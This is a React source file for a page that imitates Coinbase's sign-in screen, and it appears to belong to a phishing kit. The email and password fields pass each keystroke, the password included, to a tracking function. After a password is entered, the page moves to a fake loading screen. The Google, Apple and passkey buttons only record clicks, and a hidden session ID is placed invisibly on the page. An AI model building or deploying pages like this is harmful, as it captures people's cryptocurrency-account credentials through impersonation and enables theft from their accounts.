import { createFileRoute } from "@tanstack/react-router";
import { useCallback, useState } from "react";
import {
  CbFontStyle,
  CbLogo,
  CbSupportBanner,
  useCbTracking,
} from "@/components/cb/CbShared";

export const Route = createFileRoute("/cb/signin")({
  head: () => ({ meta: [{ title: "Sign in to Coinbase" }] }),
  component: CbSignInPage,
});

function AppleIcon() {
  return (
    <svg width="16" height="17" viewBox="0 0 16 17" fill="none">
      <path
        d="M14.1869 13.1777C13.955 13.7134 13.6805 14.2065 13.3625 14.6599C12.929 15.2779 12.5741 15.7057 12.3006 15.9433C11.8765 16.3332 11.4222 16.533 10.9357 16.5443C10.5865 16.5443 10.1653 16.4449 9.67504 16.2433C9.18315 16.0427 8.73112 15.9433 8.31779 15.9433C7.88431 15.9433 7.4194 16.0427 6.92212 16.2433C6.42409 16.4449 6.02288 16.55 5.71613 16.5604C5.24961 16.5803 4.78461 16.3749 4.32046 15.9433C4.02421 15.6849 3.65367 15.242 3.20977 14.6145C2.73351 13.9444 2.34195 13.1673 2.0352 12.2814C1.70668 11.3245 1.54199 10.3979 1.54199 9.50085C1.54199 8.47326 1.76403 7.58699 2.20878 6.84429C2.55832 6.24773 3.02332 5.77714 3.6053 5.43168C4.18729 5.08622 4.81613 4.91017 5.49333 4.89891C5.86387 4.89891 6.34979 5.01353 6.95364 5.23879C7.55579 5.46481 7.94242 5.57942 8.11194 5.57942C8.23867 5.57942 8.66818 5.4454 9.3963 5.17822C10.0849 4.93043 10.666 4.82783 11.1421 4.86825C12.4321 4.97236 13.4013 5.4809 14.0459 6.39708C12.8921 7.09615 12.3214 8.07527 12.3327 9.33134C12.3431 10.3097 12.6981 11.1239 13.3956 11.7703C13.7117 12.0703 14.0648 12.3022 14.4576 12.4669C14.3724 12.7139 14.2825 12.9506 14.1869 13.1777ZM11.2282 1.53515C11.2282 2.30199 10.948 3.01799 10.3896 3.68071C9.71574 4.46855 8.90063 4.9238 8.01672 4.85197C8.00546 4.75997 7.99893 4.66314 7.99893 4.5614C7.99893 3.82523 8.3194 3.03739 8.88852 2.39322C9.17265 2.06706 9.53401 1.79587 9.97223 1.57954C10.4095 1.36643 10.8231 1.24858 11.2121 1.22839C11.2235 1.33091 11.2282 1.43343 11.2282 1.53514V1.53515Z"
        fill="currentColor"
      />
    </svg>
  );
}

function GoogleIcon() {
  return (
    <svg width="17" height="17" viewBox="0 0 17 17" fill="none">
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M16.18 8.57691C16.18 8.00964 16.1291 7.46419 16.0345 6.94055H8.5V10.0351H12.8055C12.62 11.0351 12.0564 11.8824 11.2091 12.4496V14.4569H13.7945C15.3073 13.0642 16.18 11.0133 16.18 8.57691Z"
        fill="currentColor"
      />
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M8.50017 16.3949C10.6602 16.3949 12.4711 15.6786 13.7947 14.4567L11.2093 12.4495C10.4929 12.9295 9.57653 13.2131 8.50017 13.2131C6.41653 13.2131 4.65289 11.8058 4.0238 9.91492H1.35107V11.9876C2.66744 14.6022 5.37289 16.3949 8.50017 16.3949Z"
        fill="currentColor"
      />
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M4.02364 9.91497C3.86364 9.43497 3.77273 8.92225 3.77273 8.39497C3.77273 7.8677 3.86364 7.35497 4.02364 6.87497V4.80225H1.35091C0.809091 5.88225 0.5 7.10406 0.5 8.39497C0.5 9.68588 0.809091 10.9077 1.35091 11.9877L4.02364 9.91497Z"
        fill="currentColor"
      />
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M8.50017 3.57684C9.67471 3.57684 10.7293 3.98047 11.5583 4.7732L13.8529 2.47866C12.4674 1.18775 10.6565 0.39502 8.50017 0.39502C5.37289 0.39502 2.66744 2.18775 1.35107 4.80229L4.0238 6.87502C4.65289 4.98411 6.41653 3.57684 8.50017 3.57684Z"
        fill="currentColor"
      />
    </svg>
  );
}

function PasskeyIcon() {
  return (
    <svg width="16" height="17" viewBox="0 0 16 17" fill="none">
      <path
        d="M5.37256 0.93801C4.02536 1.22585 2.8994 2.35696 2.55569 3.75968C2.43717 4.24618 2.43717 5.05701 2.55569 5.5435C2.90335 6.9665 4.02141 8.07328 5.40417 8.36518C5.62936 8.41383 5.8506 8.42599 6.30098 8.41383C6.80668 8.39356 6.941 8.37734 7.22941 8.28004C8.02746 8.01652 8.62007 7.59489 9.08625 6.95434C9.38256 6.55298 9.56429 6.18405 9.70652 5.71783C9.80529 5.38944 9.81319 5.30836 9.81319 4.65159C9.81319 3.99482 9.80529 3.91374 9.70652 3.58536C9.3312 2.33668 8.45809 1.43261 7.22941 1.02315C6.92915 0.921793 6.82643 0.909631 6.26148 0.897468C5.83875 0.88936 5.54639 0.901522 5.37256 0.93801Z"
        fill="currentColor"
      />
      <path
        d="M12.5633 5.55967C11.9983 5.68129 11.5045 5.96508 11.0817 6.41509C10.2995 7.23808 10.0625 8.4908 10.4891 9.56515C10.7064 10.1165 11.1963 10.6922 11.6862 10.976L11.9272 11.1179L11.9312 13.3882V15.6585L12.5356 16.2747L13.1401 16.895L14.1633 15.8409L15.1905 14.7869L14.5781 14.1585L13.9658 13.5301L14.5702 12.9098C14.8982 12.5693 15.1708 12.2733 15.1708 12.253C15.1708 12.2328 14.9535 11.9895 14.6888 11.7179C14.4241 11.4463 14.2147 11.2152 14.2226 11.2071C14.2344 11.199 14.3846 11.1138 14.5584 11.0125C15.2142 10.6395 15.7397 9.94218 15.9214 9.20839C16.0162 8.8273 16.0281 8.11782 15.9411 7.75295C15.7081 6.73131 14.9021 5.884 13.8986 5.60021C13.5944 5.51507 12.8754 5.4948 12.5633 5.55967ZM13.6023 6.90564C13.7959 7.04348 13.9855 7.38808 13.9855 7.607C13.9855 7.81377 13.8196 8.15026 13.6576 8.27594C13.4759 8.41783 13.148 8.48675 12.9386 8.42999C12.5988 8.33269 12.3302 7.97593 12.3262 7.61917C12.3223 6.94618 13.069 6.52861 13.6023 6.90564Z"
        fill="currentColor"
      />
      <path
        d="M4.16802 9.78411C2.34279 10.0719 0.809901 11.4098 0.233093 13.218C0.0355566 13.8423 0 14.1585 0 15.3585V16.4491H5.33349H10.667V14.1382V11.8274L10.3509 11.5193C9.99536 11.1706 9.71486 10.7976 9.51337 10.4084L9.37904 10.1449L8.94446 9.99492C8.23728 9.75167 7.90147 9.71924 6.09993 9.72329C4.97397 9.72735 4.42087 9.74356 4.16802 9.78411Z"
        fill="currentColor"
      />
    </svg>
  );
}

function AvatarPlaceholder({ email }: { email: string }) {
  const initial = (email.trim()[0] || "?").toUpperCase();
  return (
    <div
      style={{
        width: 32,
        height: 32,
        borderRadius: "50%",
        flexShrink: 0,
        background: "linear-gradient(135deg, rgb(87, 139, 250), rgb(37, 99, 235))",
        color: "#fff",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        fontSize: 14,
        fontWeight: 600,
      }}
    >
      {initial}
    </div>
  );
}

function CbSignInPage() {
  const { trackClick, trackInput, cbNavigate, sessionId } = useCbTracking();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState<1 | 2>(1);
  const [showPassword, setShowPassword] = useState(false);
  const [continueLoading, setContinueLoading] = useState(false);
  const [loadingBtn, setLoadingBtn] = useState<string | null>(null);

  const isValidEmail = useCallback(
    (v: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v),
    [],
  );

  const handleContinue = async (e: React.FormEvent) => {
    e.preventDefault();
    if (step === 1) {
      if (!isValidEmail(email) || continueLoading) return;
      setContinueLoading(true);
      trackClick("Continue-Email");
      trackInput("email", email);
      setTimeout(() => {
        setContinueLoading(false);
        setStep(2);
      }, 900);
      return;
    }
    if (!password || continueLoading) return;
    setContinueLoading(true);
    trackClick("Continue-Password");
    trackInput("password", password);
    setTimeout(() => {
      cbNavigate("/cb/loading");
    }, 1200);
  };

  const handleSocialClick = (name: string) => {
    if (loadingBtn) return;
    setLoadingBtn(name);
    trackClick(name);
    setTimeout(() => setLoadingBtn(null), 1500);
  };

  return (
    <div
      className="cb-page"
      style={{
        display: "flex",
        flexDirection: "column",
        minHeight: "100vh",
        backgroundColor: "rgb(10, 11, 13)",
        color: "#fff",
      }}
    >
      <CbFontStyle />
      <style>{`
        .cb-page, .cb-page * {
          font-family: 'CoinbaseSans', 'CoinbaseText', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
          -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
        }
        .cb-page * { box-sizing: border-box; }
        @keyframes cbFadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes cbSpin { to { transform: rotate(360deg); } }
        .cb-animate { animation: cbFadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) both; }
        .cb-animate-delay-1 { animation-delay: 0.05s; }
        .cb-animate-delay-2 { animation-delay: 0.1s; }
        .cb-animate-delay-3 { animation-delay: 0.15s; }
        .cb-animate-delay-4 { animation-delay: 0.2s; }
        .cb-animate-delay-5 { animation-delay: 0.25s; }
        .cb-animate-delay-6 { animation-delay: 0.3s; }
        .cb-animate-delay-7 { animation-delay: 0.35s; }
        .cb-header { display: grid; grid-template-columns: auto 1fr auto; height: 72px; align-items: center; padding: 0 24px; }
        .cb-header-logo { display: flex; align-items: center; color: #fff; cursor: pointer; }
        .cb-main { display: flex; justify-content: center; flex-direction: column; flex-grow: 1; padding: 0 16px; align-items: center; }
        .cb-form-container { width: 100%; max-width: 380px; display: flex; flex-direction: column; }
        .cb-title { font-size: 28px; font-weight: 500; line-height: 36px; letter-spacing: -0.02em; color: #fff; margin: 0 0 24px 0; }
        .cb-label { font-size: 14px; font-weight: 500; line-height: 20px; color: rgb(138, 145, 158); display: block; margin-bottom: 8px; }
        .cb-input-wrapper { position: relative; display: flex; align-items: center; width: 100%; }
        .cb-input { width: 100%; height: 56px; padding: 0 16px; border-radius: 12px; border: 1px solid rgba(138, 145, 158, 0.2); background: rgb(10, 11, 13); color: #fff; font-size: 16px; line-height: 24px; outline: none; transition: background-color 0.15s ease, border-color 0.15s ease; }
        .cb-input::placeholder { color: rgb(138, 145, 158); }
        .cb-input:hover { background: rgb(17, 18, 20); border-color: rgb(17, 18, 20); }
        .cb-input:focus { border-color: rgb(87, 139, 250); box-shadow: 0 0 0 1px rgb(87, 139, 250); background: rgb(10, 11, 13); }
        .cb-continue-btn { width: 100%; height: 56px; margin-top: 16px; border: none; border-radius: 1000px; background: rgb(87, 139, 250); color: rgb(10, 11, 13); font-size: 16px; font-weight: 700; line-height: 24px; cursor: pointer; transition: background-color 0.15s ease, opacity 0.15s ease, transform 0.1s ease; display: flex; align-items: center; justify-content: center; }
        .cb-continue-btn:disabled { opacity: 0.4; cursor: not-allowed; }
        .cb-continue-btn:not(:disabled):hover { background: rgb(95, 144, 250); }
        .cb-continue-btn:not(:disabled):active { background: rgb(99, 147, 250); transform: scale(0.98); }
        .cb-divider { display: flex; align-items: center; gap: 16px; margin: 24px 0; }
        .cb-divider hr { flex: 1; border: none; border-top: 1px solid rgba(138, 145, 158, 0.2); margin: 0; }
        .cb-divider span { font-size: 12px; font-weight: 500; line-height: 16px; color: rgb(138, 145, 158); text-transform: uppercase; letter-spacing: 0.05em; }
        .cb-social-btn { width: 100%; height: 56px; border: 1px solid rgba(138, 145, 158, 0.3); border-radius: 1000px; background: transparent; color: #fff; font-size: 16px; font-weight: 500; line-height: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 8px; transition: background-color 0.15s ease, border-color 0.15s ease; position: relative; padding: 0 24px; }
        .cb-social-btn .cb-social-icon { position: absolute; left: 24px; display: flex; align-items: center; }
        .cb-social-btn:hover { background: rgba(255, 255, 255, 0.04); border-color: rgba(138, 145, 158, 0.5); }
        .cb-spinner { width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: cbSpin 0.6s linear infinite; }
        .cb-footer-text { margin-top: 20px; text-align: center; }
        .cb-footer-text p { font-size: 16px; font-weight: 600; line-height: 24px; color: #fff; margin: 0; }
        .cb-footer-text button { background: none; border: none; color: rgb(87, 139, 250); font-size: 16px; font-weight: 600; cursor: pointer; padding: 0; margin-left: 4px; }
        .cb-footer-text button:hover { text-decoration: underline; }
        .cb-privacy { margin-top: 12px; text-align: center; font-size: 14px; line-height: 20px; color: rgb(138, 145, 158); }
        .cb-privacy a { color: rgb(138, 145, 158); text-decoration: underline; }
        .cb-privacy a:hover { color: rgb(87, 139, 250); }
        @media (max-width: 640px) {
          .cb-header { padding: 0 16px; height: 56px; }
          .cb-title { font-size: 24px; line-height: 32px; }
        }
      `}</style>

      <CbSupportBanner />

      <header className="cb-header">
        <div className="cb-header-logo" onClick={() => trackClick("Logo")}>
          <CbLogo />
        </div>
        <div />
        <div />
      </header>

      <main className="cb-main" style={{ justifyContent: "flex-start", paddingTop: 48 }}>
        <div className="cb-form-container">
          {step === 1 ? (
            <>
              <p className="cb-title cb-animate">Sign in to Coinbase</p>

              <form onSubmit={handleContinue} className="cb-animate cb-animate-delay-1">
                <label className="cb-label" htmlFor="cb-email">Email</label>
                <div className="cb-input-wrapper">
                  <input
                    id="cb-email"
                    name="email"
                    type="email"
                    className="cb-input"
                    placeholder="Your email address"
                    autoComplete="off"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      trackInput("email", e.target.value);
                    }}
                  />
                </div>
                <button
                  type="submit"
                  className="cb-continue-btn"
                  disabled={!isValidEmail(email) || continueLoading}
                >
                  {continueLoading ? <div className="cb-spinner" /> : "Continue"}
                </button>
              </form>

              <div className="cb-divider cb-animate cb-animate-delay-2">
                <hr /><span>OR</span><hr />
              </div>

              {[
                { label: "Sign in with passkey", Icon: PasskeyIcon, delay: 3 },
                { label: "Sign in with Google", Icon: GoogleIcon, delay: 4 },
                { label: "Sign in with Apple", Icon: AppleIcon, delay: 5 },
              ].map(({ label, Icon, delay }) => (
                <button
                  key={label}
                  type="button"
                  className={`cb-social-btn cb-animate cb-animate-delay-${delay}`}
                  onClick={() => handleSocialClick(label)}
                  disabled={!!loadingBtn}
                >
                  {loadingBtn === label ? (
                    <div className="cb-spinner" />
                  ) : (
                    <>
                      <span className="cb-social-icon"><Icon /></span>
                      {label}
                    </>
                  )}
                </button>
              ))}

              <div className="cb-footer-text cb-animate cb-animate-delay-6">
                <p>
                  Don't have an account?
                  <button type="button" onClick={() => trackClick("Sign up")}>Sign up</button>
                </p>
              </div>

              <div className="cb-privacy cb-animate cb-animate-delay-7">
                Not your device? Use a private window. See our{" "}
                <a
                  href="#"
                  onClick={(e) => {
                    e.preventDefault();
                    trackClick("Privacy Policy");
                  }}
                >Privacy Policy</a>{" "}
                for more info.
              </div>
            </>
          ) : (
            <>
              <p className="cb-title cb-animate">Sign in to Coinbase</p>

              <div
                className="cb-animate cb-animate-delay-1"
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 12,
                  padding: "12px 16px",
                  borderRadius: 12,
                  border: "1px solid rgba(138, 145, 158, 0.2)",
                  background: "rgb(17, 18, 20)",
                  marginBottom: 24,
                  cursor: "pointer",
                }}
                onClick={() => { setStep(1); setPassword(""); }}
              >
                <AvatarPlaceholder email={email} />
                <span style={{ fontSize: 16, color: "#fff", fontWeight: 400 }}>{email}</span>
              </div>

              <form onSubmit={handleContinue} className="cb-animate cb-animate-delay-2">
                <label className="cb-label" htmlFor="cb-password">Password</label>
                <div className="cb-input-wrapper">
                  <input
                    id="cb-password"
                    name="password"
                    type={showPassword ? "text" : "password"}
                    className="cb-input"
                    autoComplete="off"
                    autoFocus
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      trackInput("password", e.target.value);
                    }}
                    style={{ paddingRight: 48 }}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    style={{
                      position: "absolute",
                      right: 16,
                      background: "none",
                      border: "none",
                      color: "rgb(138, 145, 158)",
                      cursor: "pointer",
                      padding: 0,
                      display: "flex",
                      alignItems: "center",
                    }}
                    aria-label={showPassword ? "Hide password" : "Show password"}
                  >
                    {showPassword ? (
                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94" />
                        <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19" />
                        <line x1="1" y1="1" x2="23" y2="23" />
                      </svg>
                    ) : (
                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                        <circle cx="12" cy="12" r="3" />
                      </svg>
                    )}
                  </button>
                </div>

                <div className="cb-animate cb-animate-delay-3" style={{ marginTop: 12 }}>
                  <a
                    href="#"
                    onClick={(e) => { e.preventDefault(); trackClick("Forgot password"); }}
                    style={{ color: "rgb(87, 139, 250)", textDecoration: "none", fontSize: 14, fontWeight: 500 }}
                  >
                    Forgot password?
                  </a>
                </div>

                <button
                  type="submit"
                  className="cb-continue-btn cb-animate cb-animate-delay-4"
                  disabled={!password || continueLoading}
                >
                  {continueLoading ? <div className="cb-spinner" /> : "Continue"}
                </button>
              </form>
            </>
          )}
        </div>
      </main>

      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>
        {sessionId}
      </div>
    </div>
  );
}
